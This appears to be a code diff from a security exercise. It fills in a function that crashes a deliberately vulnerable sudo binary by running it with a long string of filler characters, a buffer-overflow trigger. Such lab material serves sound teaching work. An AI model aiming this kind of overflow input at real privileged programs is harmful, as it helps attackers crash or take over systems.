@@ -11,8 +11,8 @@ def crash_sudo(path_to_sudo: str):
 
     :param path_to_sudo: The path to the vulnerable sudo program.
     """
-    # Your code goes here.
-    raise NotImplementedError()
+    crash_param = "AAAAABBBBBCCCCCDDDDDEEEEEFFFFFGGGGGHHHHHIIIIIJJJJJKKKKKLLLLLMMMMMNNNNNOOOOO"
+    os.execl(path_to_sudo, path_to_sudo, crash_param, 'whoami') 
 
 
 def main(argv):
